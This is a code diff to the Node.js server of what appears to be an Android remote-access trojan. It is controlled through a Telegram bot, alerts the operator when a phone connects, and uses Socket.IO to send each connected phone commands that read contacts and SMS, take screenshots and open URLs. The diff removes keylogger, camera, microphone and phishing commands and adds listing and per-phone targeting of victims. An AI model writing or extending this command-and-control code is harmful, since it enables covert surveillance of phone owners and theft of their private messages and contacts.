@@ -1,5 +1,4 @@
-// index.js - Telegram Bot + Socket.IO Server
-
+// index.js - Telegram Bot + Socket.IO Server (مع لائحة الهواتف)
 const fs = require('fs');
 const path = require('path');
 const http = require('http');
@@ -29,68 +28,54 @@ try {
 const COMMAND_MAP = {
     contacts: { instruction: "CMD:CONTACTS_READ", type: "simple" },
     sms: { instruction: "CMD:SMS_READ", type: "simple" },
-    file_explorer: { instruction: "CMD:FILE_EXPLORER_ROOT", type: "simple" },
-    clipboard: { instruction: "CMD:CLIPBOARD_READ", type: "simple" },
-    apps: { instruction: "CMD:APPS_LIST", type: "simple" },
-    main_camera: { instruction: "CMD:CAMERA_MAIN_SNAP", type: "simple" },
-    selfie_camera: { instruction: "CMD:CAMERA_SELFIE_SNAP", type: "simple" },
-    microphone: { instruction: "CMD:MIC_RECORD_SHORT", type: "simple" },
-    screenshot: { instruction: "CMD:SCREEN_CAPTURE", type: "simple" },
     vibrate: { instruction: "CMD:VIBRATE_SHORT", type: "simple" },
-    play_audio: { instruction: "CMD:AUDIO_PLAY_DEFAULT", type: "simple" },
-    keylogger_on: { instruction: "CMD:KEYLOGGER_START", type: "simple" },
-    keylogger_off: { instruction: "CMD:KEYLOGGER_STOP", type: "simple" },
-    phishing: { instruction_prefix: "CMD:PHISHING_INIT|", type: "arg" },
+    screenshot: { instruction: "CMD:SCREEN_CAPTURE", type: "simple" },
     open_url: { instruction_prefix: "CMD:URL_OPEN|", type: "arg" }
 };
 
 // --- EXPRESS + SOCKET.IO ---
 const app = express();
 const server = http.createServer(app);
-const PORT = process.env.PORT || 3000;
+const PORT = 3000;
 const io = new Server(server, { cors: { origin: "*" } });
 
 let connectedClients = {};
 
+// دالة لتوليد اسم عشوائي
+function generateRandomName() {
+    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    const numbers = '0123456789';
+    const name = 'phone_' + 
+        letters.charAt(Math.floor(Math.random() * letters.length)) +
+        letters.charAt(Math.floor(Math.random() * letters.length)) +
+        numbers.charAt(Math.floor(Math.random() * numbers.length)) +
+        numbers.charAt(Math.floor(Math.random() * numbers.length));
+    return name;
+}
+
+// Socket.IO
 io.on('connection', (socket) => {
-    console.log("Client connected:", socket.id);
+    const clientId = generateRandomName();
+    connectedClients[clientId] = socket;
 
-    socket.on('register', (data) => {
-        if (!data.clientId) return;
-        connectedClients[data.clientId] = socket;
-        console.log("Registered client:", data.clientId);
-
-        // --- Telegram Alert on Phone Connection ---
-        bot.sendMessage(CHAT_ID, `📱 الهاتف ${data.clientId} متصل الآن.`);
-    });
+    console.log(`Client connected: ${clientId} (socket.id=${socket.id})`);
+    bot.sendMessage(CHAT_ID, `📱 الهاتف ${clientId} متصل الآن.`);
 
     socket.on('response', (data) => {
-        console.log(`[RESPONSE] ${data.clientId}:`, data);
+        console.log(`[RESPONSE] ${clientId}:`, data.response || data);
     });
 
     socket.on('disconnect', () => {
-        for (const id in connectedClients) {
-            if (connectedClients[id] === socket) {
-                delete connectedClients[id];
-                console.log("Client disconnected:", id);
-
-                // --- Telegram Alert on Phone Disconnect ---
-                bot.sendMessage(CHAT_ID, `⚠️ الهاتف ${id} تم فصله.`);
-            }
-        }
+        delete connectedClients[clientId];
+        console.log(`Client disconnected: ${clientId}`);
+        bot.sendMessage(CHAT_ID, `⚠️ الهاتف ${clientId} تم فصله.`);
     });
 });
 
 server.listen(PORT, () => console.log(`Socket Server listening on port ${PORT}`));
 
 // --- TELEGRAM BOT ---
-const bot = new TelegramBot(TOKEN, {
-    polling: {
-        interval: 1000,
-        autoStart: true,
-        params: { timeout: 10 }
-    }
-});
+const bot = new TelegramBot(TOKEN, { polling: true });
 console.log("Telegram Bot Initialized.");
 
 // --- HELPER FUNCTIONS ---
@@ -107,24 +92,52 @@ function handleTelegramCommand(commandKey, msg, argument) {
     const commandData = COMMAND_MAP[commandKey];
     if (!commandData) return bot.sendMessage(msg.chat.id, "Command not recognized.");
 
-    const clientId = "phone_1"; // مثال ثابت، يمكن تغييره حسب النظام
-    let result;
+    // اختيار الهاتف
+    let clientId = null;
+    let arg = argument || null;
 
+    if (argument && argument.includes(' ')) {
+        const split = argument.split(' ');
+        clientId = split[0];
+        arg = split.slice(1).join(' ');
+    }
+
+    if (!clientId) {
+        const clientIds = Object.keys(connectedClients);
+        if (clientIds.length === 0) return bot.sendMessage(msg.chat.id, "No clients connected.");
+        clientId = clientIds[clientIds.length - 1];
+    }
+
+    if (!connectedClients[clientId]) return bot.sendMessage(msg.chat.id, `Client ${clientId} not connected.`);
+
+    let result;
     if (commandData.type === "simple") {
         result = sendCommandToClient(clientId, commandData.instruction);
     } else if (commandData.type === "arg") {
-        const arg = argument || "N/A";
-        result = sendCommandToClient(clientId, commandData.instruction_prefix + arg);
+        const payload = arg || "N/A";
+        result = sendCommandToClient(clientId, commandData.instruction_prefix + payload);
     }
 
     bot.sendMessage(msg.chat.id, result);
 }
 
-// --- TELEGRAM COMMAND LISTENERS ---
+// --- TELEGRAM COMMANDS ---
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     const commands = Object.keys(COMMAND_MAP).map(k => `/${k}`).join(', ');
-    bot.sendMessage(chatId, `Remote Control Initialized.\nAvailable Commands: ${commands}\nUse /open_url [url] or /phishing [url] for arguments.`);
+    bot.sendMessage(chatId, `Remote Control Initialized.\nAvailable Commands: ${commands}\nUse /clients to see connected phones.\nUse /open_url [phoneId] [url] for arguments.`);
+});
+
+// أمر جديد: عرض جميع الهواتف المتصلة
+bot.onText(/\/clients/, (msg) => {
+    const chatId = msg.chat.id;
+    const clientIds = Object.keys(connectedClients);
+    if (clientIds.length === 0) {
+        bot.sendMessage(chatId, "🚫 لا توجد هواتف متصلة.");
+    } else {
+        const list = clientIds.map((id, idx) => `${idx + 1}. ${id}`).join('\n');
+        bot.sendMessage(chatId, `📱 الهواتف المتصلة:\n${list}`);
+    }
 });
 
 // Simple commands
@@ -141,7 +154,7 @@ if (argKeys.length > 0) {
     bot.onText(argRegex, (msg, match) => handleTelegramCommand(match[1], msg, match[2]));
 }
 
-// Unknown messages
+// أي رسالة غير معروفة
 bot.on('message', (msg) => {
     if (msg.text && !msg.text.startsWith('/')) bot.sendMessage(msg.chat.id, "Command not recognized. Type /start to see commands.");
 });
